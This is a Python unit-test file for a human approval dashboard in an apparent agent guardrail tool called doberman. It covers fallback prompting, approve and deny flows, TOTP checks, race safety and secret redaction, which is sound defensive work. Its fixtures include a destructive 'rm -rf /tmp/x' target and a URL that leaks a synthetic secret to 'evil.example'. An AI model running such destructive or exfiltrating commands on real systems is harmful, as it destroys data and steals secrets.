"""Unit tests for D3 — interactive AUTH approve/deny via the dashboard.

Covers the full loop: ``DashboardPrompter`` (the decision-path side, implementing the existing
``Prompter`` protocol) queuing a row into ``doberman.storage.approvals`` and polling it, the
dash server's ``/api/pending``/``/api/resolve/{id}`` routes (the human-facing side), and the
race-safety/redaction/fallback guarantees documented in ``dashboard_prompter.py`` and
``approvals.py``.

Test-design notes (load-bearing, see module docstrings for the "why"):

* ``run_auth_challenge``/``DashboardPrompter.confirm`` are SYNCHRONOUS and call ``asyncio.run``
  internally — tests that exercise them directly must be plain ``def test_...()``, never
  ``async def`` (an already-running event loop would make the internal ``asyncio.run`` raise).
  Tests that only call ``doberman.storage.approvals.*`` (itself async) are ``async def``.
* ``heartbeat_is_fresh`` is checked against the REAL wall clock inside ``confirm()`` (no ``now=``
  override reaches it), so "fresh" scenarios call ``touch_heartbeat(root)`` with no override, and
  "stale" scenarios write an old timestamp explicitly.
* ``dashboard_prompter._sleep`` is the poll-wait seam: tests monkeypatch it to resolve the pending
  row synchronously (via ``asyncio.run``) instead of sleeping, so nothing here waits on wall time
  except the one real (tiny) timeout test.
"""

import asyncio
import json
from datetime import datetime, timedelta, timezone

from starlette.testclient import TestClient

from doberman.auth import dashboard_prompter, totp
from doberman.auth.challenge import run_auth_challenge
from doberman.auth.dashboard_prompter import DashboardPrompter
from doberman.auth.gui_prompter import FallbackPrompter
from doberman.dash.app import create_app
from doberman.models import (
    ActionType,
    Decision,
    EffectSet,
    GuardrailResult,
    ReasonCode,
    Risk,
    SecurityObject,
    Verdict,
)
from doberman.storage import approvals
from doberman.storage.heartbeat import touch_heartbeat

_TOKEN = "test-dash-token-0123456789"  # noqa: S105 - fixture value, not a real secret
_SECRET = "SYNTHETIC-SECRET-AKIA0000TEST"  # noqa: S105 - synthetic test fixture, not a real key
_NOW = datetime(2026, 7, 18, tzinfo=timezone.utc)


def _decision_and_action(
    *,
    risk: Risk,
    reason_codes: list[ReasonCode],
    action_type: ActionType = ActionType.shell_exec,
    target: str | None = "rm -rf /tmp/x",
    action_id: str = "action-1",
    effects: EffectSet | None = None,
) -> tuple[Decision, SecurityObject]:
    """Build a matched (Decision, SecurityObject) AUTH pair for a challenge."""
    action = SecurityObject(
        id=action_id,
        ts=_NOW,
        agent_role="tester",
        action_type=action_type,
        tool_name="shell",
        target=target,
        risk=risk,
    )
    objective = GuardrailResult(
        verdict=Verdict.AUTH, risk=risk, reason_codes=reason_codes, explanation="test explanation"
    )
    decision = Decision(
        action_id=action_id,
        final_verdict=Verdict.AUTH,
        final_risk=risk,
        objective=objective,
        reason_codes=reason_codes,
        explanation="test explanation",
        decided_at=_NOW,
        effects=effects,
    )
    return decision, action


class _RecordingPrompter:
    """A fallback channel that records calls, so tests can assert the chain fell through to it."""

    def __init__(self, *, confirm_result: bool = True, code: str = "123456") -> None:
        self.confirm_calls: list[str] = []
        self.read_code_calls: list[str] = []
        self._confirm_result = confirm_result
        self._code = code

    def confirm(self, message: str) -> bool:
        self.confirm_calls.append(message)
        return self._confirm_result

    def read_code(self, message: str) -> str:
        self.read_code_calls.append(message)
        return self._code


def _make_resolver(root: str, *, decision: str, totp_code: str | None = None):
    """Monkeypatch target for ``dashboard_prompter._sleep``.

    Instead of actually sleeping, resolves the (single) pending row for ``root`` the first time
    it's called — this lets ``DashboardPrompter.confirm()``'s poll loop observe the resolution on
    its NEXT iteration, deterministically and without any real wait.
    """
    state = {"done": False}

    def _resolver(seconds: float) -> None:  # noqa: ARG001 - seconds unused; we resolve, not wait
        if state["done"]:
            return
        state["done"] = True
        rows = asyncio.run(approvals.list_pending(repo_root=root))
        assert rows, "expected exactly one pending row to resolve"
        asyncio.run(
            approvals.resolve(rows[0]["id"], decision=decision, totp_code=totp_code, repo_root=root)
        )

    return _resolver


# --- (a) stale/missing heartbeat -> immediate fallback --------------------------------------


def test_missing_heartbeat_falls_back_immediately(tmp_path):
    """No dashboard has ever run here (no heartbeat file) -> dash channel never engages."""
    root = str(tmp_path)
    decision, action = _decision_and_action(
        risk=Risk.low, reason_codes=[ReasonCode.destructive_command]
    )
    fallback = _RecordingPrompter(confirm_result=True)
    chain = FallbackPrompter([DashboardPrompter(root), fallback])

    result = run_auth_challenge(decision, action, prompter=chain)

    assert result.approved is True
    assert fallback.confirm_calls


def test_stale_heartbeat_falls_back_immediately_two_factor(tmp_path, monkeypatch):
    """Regression test for the _engaged bugfix.

    A stale heartbeat means confirm() never actually answers through the dashboard channel.
    Before the fix, read_code() would then raise a bare EOFError (not PrompterUnavailableError),
    which FallbackPrompter does NOT catch — the whole challenge would die as a silent "error"
    denial instead of falling through to the next channel's read_code(). This asserts the
    two_factor tier (which calls read_code) still reaches — and succeeds via — the fallback.
    """
    root = str(tmp_path)
    touch_heartbeat(root, now=datetime(2020, 1, 1, tzinfo=timezone.utc))  # ancient -> stale
    monkeypatch.setattr(totp, "verify", lambda code, **_kw: code == "654321")
    decision, action = _decision_and_action(
        risk=Risk.high, reason_codes=[ReasonCode.sensitive_secret_access]
    )
    fallback = _RecordingPrompter(confirm_result=True, code="654321")
    chain = FallbackPrompter([DashboardPrompter(root), fallback])

    result = run_auth_challenge(decision, action, prompter=chain)

    assert result.approved is True
    assert result.method == "totp"
    assert fallback.confirm_calls
    assert fallback.read_code_calls


# --- (b)/(c) fresh heartbeat -> dashboard resolves the challenge -----------------------------


def test_fresh_heartbeat_approve_resolves_challenge(tmp_path, monkeypatch):
    root = str(tmp_path)
    touch_heartbeat(root)
    monkeypatch.setattr(dashboard_prompter, "_sleep", _make_resolver(root, decision="approved"))
    decision, action = _decision_and_action(
        risk=Risk.low, reason_codes=[ReasonCode.destructive_command]
    )

    result = run_auth_challenge(decision, action, prompter=DashboardPrompter(root))

    assert result.approved is True
    assert result.method == "soft_confirm"
    assert asyncio.run(approvals.list_pending(repo_root=root)) == []  # row consumed


def test_fresh_heartbeat_deny_denies_challenge(tmp_path, monkeypatch):
    root = str(tmp_path)
    touch_heartbeat(root)
    monkeypatch.setattr(dashboard_prompter, "_sleep", _make_resolver(root, decision="denied"))
    decision, action = _decision_and_action(
        risk=Risk.low, reason_codes=[ReasonCode.destructive_command]
    )

    result = run_auth_challenge(decision, action, prompter=DashboardPrompter(root))

    assert result.approved is False
    assert asyncio.run(approvals.list_pending(repo_root=root)) == []  # row consumed


# --- (d) timeout with no resolution falls back; expired row is unresolvable -----------------


def test_timeout_with_no_resolution_falls_back(tmp_path):
    root = str(tmp_path)
    touch_heartbeat(root)
    fallback = _RecordingPrompter(confirm_result=True)
    dash = DashboardPrompter(root, timeout_s=0.05, poll_interval_s=0.01)
    chain = FallbackPrompter([dash, fallback])
    decision, action = _decision_and_action(
        risk=Risk.low, reason_codes=[ReasonCode.destructive_command]
    )

    result = run_auth_challenge(decision, action, prompter=chain)

    assert result.approved is True
    assert fallback.confirm_calls


async def test_expired_row_cannot_be_resolved(tmp_path):
    root = str(tmp_path)
    approval_id = await approvals.create_pending(
        "action-1",
        tier="soft_confirm",
        action_type="shell_exec",
        risk="low",
        reason_codes=["destructive_command"],
        explanation="test",
        target_path_class=None,
        repo_root=root,
        now=_NOW,
        ttl_s=1.0,
    )

    resolved = await approvals.resolve(
        approval_id, decision="approved", repo_root=root, now=_NOW + timedelta(hours=1)
    )

    assert resolved is False  # expired -> unresolvable
    row = await approvals.get_pending(approval_id, repo_root=root)
    assert row["status"] == "pending"  # no side effect
    assert row["decision"] is None


# --- (e) race: two concurrent resolves of one row -> exactly one wins -----------------------


async def test_concurrent_resolve_exactly_one_wins(tmp_path):
    root = str(tmp_path)
    # No now= override on create_pending: resolve() below also uses the real clock (no
    # override), so both sides must agree on which clock decides "not yet expired".
    approval_id = await approvals.create_pending(
        "action-1",
        tier="soft_confirm",
        action_type="shell_exec",
        risk="low",
        reason_codes=["destructive_command"],
        explanation="test",
        target_path_class=None,
        repo_root=root,
    )

    results = await asyncio.gather(
        approvals.resolve(approval_id, decision="approved", repo_root=root),
        approvals.resolve(approval_id, decision="denied", repo_root=root),
    )

    assert sorted(results) == [False, True]
    row = await approvals.get_pending(approval_id, repo_root=root)
    assert row["status"] == "resolved"
    assert row["decision"] in ("approved", "denied")


# --- (f) TOTP tier: code rides the row, verified via the EXISTING totp path -----------------


def test_totp_tier_code_flows_through_existing_verification(tmp_path, monkeypatch):
    root = str(tmp_path)
    touch_heartbeat(root)
    calls = []
    monkeypatch.setattr(
        totp, "verify", lambda code, **_kw: (calls.append(code), code == "999000")[1]
    )
    monkeypatch.setattr(
        dashboard_prompter, "_sleep", _make_resolver(root, decision="approved", totp_code="999000")
    )
    decision, action = _decision_and_action(
        risk=Risk.high, reason_codes=[ReasonCode.sensitive_secret_access]
    )

    result = run_auth_challenge(decision, action, prompter=DashboardPrompter(root))

    assert result.approved is True
    assert result.method == "totp"
    assert calls == ["999000"]  # verified from the PROMPTER side, via the existing totp module


# --- blast-radius preview (ADR 0094): rendered into the pending explanation -----------------


def test_effects_line_appended_to_the_pending_explanation_when_present(tmp_path, monkeypatch):
    root = str(tmp_path)
    touch_heartbeat(root)
    captured: dict = {}

    def _resolver(seconds):  # noqa: ARG001
        rows = asyncio.run(approvals.list_pending(repo_root=root))
        captured["explanation"] = rows[0]["explanation"]
        asyncio.run(approvals.resolve(rows[0]["id"], decision="approved", repo_root=root))

    monkeypatch.setattr(dashboard_prompter, "_sleep", _resolver)
    effects = EffectSet(
        file_count=3, dir_count=1, capped=False, hits_git=False, hits_outside_repo=False, digest="d"
    )
    decision, action = _decision_and_action(
        risk=Risk.low, reason_codes=[ReasonCode.destructive_command], effects=effects
    )

    result = run_auth_challenge(decision, action, prompter=DashboardPrompter(root))

    assert result.approved is True
    assert "Blast radius: 3 files in 1 directory" in captured["explanation"]


def test_no_effects_line_in_the_pending_explanation_when_absent(tmp_path, monkeypatch):
    root = str(tmp_path)
    touch_heartbeat(root)
    captured: dict = {}

    def _resolver(seconds):  # noqa: ARG001
        rows = asyncio.run(approvals.list_pending(repo_root=root))
        captured["explanation"] = rows[0]["explanation"]
        asyncio.run(approvals.resolve(rows[0]["id"], decision="approved", repo_root=root))

    monkeypatch.setattr(dashboard_prompter, "_sleep", _resolver)
    decision, action = _decision_and_action(
        risk=Risk.low, reason_codes=[ReasonCode.destructive_command]
    )

    result = run_auth_challenge(decision, action, prompter=DashboardPrompter(root))

    assert result.approved is True
    assert captured["explanation"] == "test explanation"  # unchanged, no blast-radius line


def test_dash_app_never_imports_totp():
    """Structural guarantee: the dash server never verifies codes itself (no totp import)."""
    import doberman.dash.app as dash_app_module

    assert "totp" not in vars(dash_app_module)


# --- (g) redaction: a synthetic secret never appears in the row or the API ------------------


def test_secret_never_appears_in_pending_row_or_api(tmp_path, monkeypatch):
    root = str(tmp_path)
    touch_heartbeat(root)
    app = create_app(_TOKEN, root)
    client = TestClient(app)
    captured: dict = {}

    def _resolver(seconds):  # noqa: ARG001
        resp = client.get("/api/pending", headers={"Authorization": f"Bearer {_TOKEN}"})
        assert _SECRET not in resp.text
        assert _SECRET.encode() not in resp.content
        rows = resp.json()
        assert len(rows) == 1
        row = rows[0]
        assert _SECRET not in json.dumps(row)
        captured["id"] = row["id"]
        resolve_resp = client.post(
            f"/api/resolve/{row['id']}",
            headers={"Authorization": f"Bearer {_TOKEN}"},
            json={"decision": "approved"},
        )
        assert resolve_resp.status_code == 200

    monkeypatch.setattr(dashboard_prompter, "_sleep", _resolver)
    # network_request is not a path-class action, so a secret embedded in `target`
    # can never leak into `target_path_class` — see doberman.storage.log.path_class.
    decision, action = _decision_and_action(
        risk=Risk.low,
        reason_codes=[ReasonCode.destructive_command],
        action_type=ActionType.network_request,
        target=f"https://evil.example/?leak={_SECRET}",
    )

    result = run_auth_challenge(decision, action, prompter=DashboardPrompter(root))

    assert result.approved is True
    persisted = asyncio.run(approvals.get_pending(captured["id"], repo_root=root))
    assert _SECRET not in json.dumps(persisted)


# --- (h) auth 401 matrix on both endpoints ---------------------------------------------------


def test_pending_without_token_is_401(tmp_path):
    client = TestClient(create_app(_TOKEN, str(tmp_path)))
    assert client.get("/api/pending").status_code == 401


def test_pending_with_wrong_token_is_401(tmp_path):
    client = TestClient(create_app(_TOKEN, str(tmp_path)))
    resp = client.get("/api/pending", headers={"Authorization": "Bearer wrong"})
    assert resp.status_code == 401


def test_resolve_without_token_is_401(tmp_path):
    client = TestClient(create_app(_TOKEN, str(tmp_path)))
    resp = client.post("/api/resolve/some-id", json={"decision": "approved"})
    assert resp.status_code == 401


def test_resolve_with_wrong_token_is_401(tmp_path):
    client = TestClient(create_app(_TOKEN, str(tmp_path)))
    resp = client.post(
        "/api/resolve/some-id",
        headers={"Authorization": "Bearer wrong"},
        json={"decision": "approved"},
    )
    assert resp.status_code == 401


# --- extra HTTP-layer coverage: field allow-list + resolve idempotency ----------------------


def test_pending_lists_allowlisted_fields_only(tmp_path):
    root = str(tmp_path)
    # No now= override: the /api/pending route calls list_pending() with no override either
    # (real clock), so the row must not appear "expired" against the real wall clock.
    asyncio.run(
        approvals.create_pending(
            "action-1",
            tier="two_factor",
            action_type="shell_exec",
            risk="high",
            reason_codes=["sensitive_secret_access"],
            explanation="needs review",
            target_path_class="backend/*.py",
            repo_root=root,
        )
    )
    client = TestClient(create_app(_TOKEN, root))

    resp = client.get("/api/pending", headers={"Authorization": f"Bearer {_TOKEN}"})

    assert resp.status_code == 200
    rows = resp.json()
    assert len(rows) == 1
    row = rows[0]
    assert set(row.keys()) == {
        "id",
        "created_at",
        "expires_at",
        "tier",
        "action_type",
        "risk",
        "reason_codes",
        "explanation",
        "target_path_class",
        "needs_totp",
    }
    assert row["needs_totp"] is True  # two_factor tier
    assert row["explanation"] == "needs review"


def test_resolve_bad_decision_value_is_400(tmp_path):
    client = TestClient(create_app(_TOKEN, str(tmp_path)))
    resp = client.post(
        "/api/resolve/nonexistent-id",
        headers={"Authorization": f"Bearer {_TOKEN}"},
        json={"decision": "maybe"},
    )
    assert resp.status_code == 400


def test_resolve_twice_is_200_then_409(tmp_path):
    root = str(tmp_path)
    # No now= override: the /api/resolve route calls resolve() with no override (real clock).
    approval_id = asyncio.run(
        approvals.create_pending(
            "action-1",
            tier="soft_confirm",
            action_type="shell_exec",
            risk="low",
            reason_codes=["destructive_command"],
            explanation="e",
            target_path_class=None,
            repo_root=root,
        )
    )
    client = TestClient(create_app(_TOKEN, root))

    first = client.post(
        f"/api/resolve/{approval_id}",
        headers={"Authorization": f"Bearer {_TOKEN}"},
        json={"decision": "approved"},
    )
    second = client.post(
        f"/api/resolve/{approval_id}",
        headers={"Authorization": f"Bearer {_TOKEN}"},
        json={"decision": "denied"},
    )

    assert first.status_code == 200
    assert second.status_code == 409
